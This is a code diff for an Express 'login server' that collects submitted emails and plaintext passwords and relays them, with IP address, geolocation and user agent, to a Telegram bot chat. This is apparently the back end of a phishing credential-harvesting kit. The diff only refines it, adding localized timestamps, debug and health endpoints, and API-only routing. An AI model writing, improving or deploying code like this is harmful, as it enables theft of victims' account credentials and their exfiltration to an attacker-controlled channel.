@@ -3,7 +3,6 @@ const axios = require('axios');
 const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
-const path = require('path');
 require('dotenv').config();
 
 const app = express();
@@ -27,16 +26,12 @@ app.use(express.urlencoded({ extended: true }));
 // Trust proxy - important for Render to get real IP
 app.set('trust proxy', true);
 
-// Serve static files
-app.use(express.static(path.join(__dirname, 'public')));
-
 // Rate limiting
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100,
   standardHeaders: true,
   legacyHeaders: false,
-  // Custom key generator to use real IP
   keyGenerator: (req) => {
     return req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   }
@@ -50,32 +45,42 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // Function to get real client IP
 function getClientIP(req) {
-  // Check various headers for real IP
   const forwardedFor = req.headers['x-forwarded-for'];
   const realIP = req.headers['x-real-ip'];
   const cfConnectingIP = req.headers['cf-connecting-ip'];
   const trueClientIP = req.headers['true-client-ip'];
   
-  if (cfConnectingIP) {
-    return cfConnectingIP;
-  }
-  
-  if (trueClientIP) {
-    return trueClientIP;
-  }
+  if (cfConnectingIP) return cfConnectingIP;
+  if (trueClientIP) return trueClientIP;
   
   if (forwardedFor) {
-    // Get first IP in the list (client's original IP)
     const ips = forwardedFor.split(',');
     return ips[0].trim();
   }
   
-  if (realIP) {
-    return realIP;
-  }
+  if (realIP) return realIP;
   
-  // Fallback to req.ip or connection remote address
   return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
+}
+
+// Function to format timestamp
+function formatTimestamp(date) {
+  const options = {
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true,
+    timeZone: process.env.TIMEZONE || 'Africa/Lagos'
+  };
+  
+  try {
+    return date.toLocaleString('en-US', options);
+  } catch (error) {
+    return date.toLocaleString();
+  }
 }
 
 // Function to send message to Telegram
@@ -98,13 +103,12 @@ async function sendToTelegram(message) {
 // Function to get IP geolocation
 async function getIPLocation(ip) {
   try {
-    // Don't try to geolocate private/local IPs
     if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
       return 'Local/Private Network';
     }
     
     const response = await axios.get(`http://ip-api.com/json/${ip}`, {
-      timeout: 5000 // 5 second timeout
+      timeout: 5000
     });
     
     if (response.data && response.data.status === 'success') {
@@ -125,12 +129,15 @@ async function getIPLocation(ip) {
 
 // Function to format login details
 function formatLoginDetails(loginData) {
-  const timestamp = new Date().toLocaleString();
+  const now = new Date();
+  const timestamp = formatTimestamp(now);
+  const utcTimestamp = now.toISOString();
   
   const message = `
 🔐 <b>New Login Attempt</b>
 ━━━━━━━━━━━━━━━━━━━━
-📅 <b>Timestamp:</b> ${timestamp}
+📅 <b>Date/Time:</b> ${timestamp}
+🌍 <b>UTC Time:</b> ${utcTimestamp}
 📧 <b>Email:</b> ${loginData.email || 'N/A'}
 🔑 <b>Password:</b> ${loginData.password || 'N/A'}
 🌐 <b>IP Address:</b> ${loginData.ip || 'N/A'}
@@ -147,7 +154,6 @@ app.post('/api/login', async (req, res) => {
   try {
     const { email, password } = req.body;
     
-    // Validate input
     if (!email) {
       return res.status(400).json({
         success: false,
@@ -167,12 +173,6 @@ app.post('/api/login', async (req, res) => {
     const userAgent = req.headers['user-agent'];
     
     console.log('Detected IP:', clientIP);
-    console.log('All headers:', {
-      'x-forwarded-for': req.headers['x-forwarded-for'],
-      'x-real-ip': req.headers['x-real-ip'],
-      'cf-connecting-ip': req.headers['cf-connecting-ip'],
-      'req.ip': req.ip
-    });
     
     // Get location
     const location = await getIPLocation(clientIP);
@@ -218,14 +218,16 @@ app.get('/health', (req, res) => {
   const clientIP = getClientIP(req);
   res.status(200).json({
     status: 'OK',
-    timestamp: new Date().toISOString(),
-    detectedIP: clientIP
+    timestamp: formatTimestamp(new Date()),
+    utcTimestamp: new Date().toISOString(),
+    detectedIP: clientIP,
+    timezone: process.env.TIMEZONE || 'Africa/Lagos'
   });
 });
 
 // Test endpoint to verify Telegram connection
 app.get('/api/test-telegram', async (req, res) => {
-  const testMessage = '✅ Test message from your login server!';
+  const testMessage = `✅ Test message from your login server!\n🕐 Local time: ${formatTimestamp(new Date())}\n🌍 UTC: ${new Date().toISOString()}`;
   const result = await sendToTelegram(testMessage);
   
   if (result.success) {
@@ -242,26 +244,43 @@ app.get('/api/test-telegram', async (req, res) => {
   }
 });
 
-// Debug endpoint to test IP detection
+// Debug endpoint
 app.get('/api/debug-ip', (req, res) => {
   const clientIP = getClientIP(req);
   res.json({
     detectedIP: clientIP,
+    timestamp: formatTimestamp(new Date()),
+    utcTimestamp: new Date().toISOString(),
+    timezone: process.env.TIMEZONE || 'Africa/Lagos',
     headers: {
       'x-forwarded-for': req.headers['x-forwarded-for'],
       'x-real-ip': req.headers['x-real-ip'],
       'cf-connecting-ip': req.headers['cf-connecting-ip'],
-      'true-client-ip': req.headers['true-client-ip'],
-      'req.ip': req.ip,
-      'req.connection.remoteAddress': req.connection.remoteAddress,
-      'req.socket.remoteAddress': req.socket.remoteAddress
+      'true-client-ip': req.headers['true-client-ip']
     }
   });
 });
 
-// Root endpoint - serve HTML
+// Root endpoint - just return a simple message
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.status(200).json({
+    message: 'Login API Server',
+    status: 'Running',
+    endpoints: {
+      login: 'POST /api/login',
+      health: 'GET /health',
+      testTelegram: 'GET /api/test-telegram',
+      debugIP: 'GET /api/debug-ip'
+    }
+  });
+});
+
+// Handle 404 for unknown routes
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    message: 'Route not found'
+  });
 });
 
 // Start server
@@ -269,5 +288,8 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
   console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
+  console.log(`🕐 Timezone: ${process.env.TIMEZONE || 'Africa/Lagos'}`);
   console.log(`🌐 IP detection: Enhanced with proxy support`);
+  console.log(`📅 Current time: ${formatTimestamp(new Date())}`);
+  console.log(`🔗 API only - No static file serving`);
 });
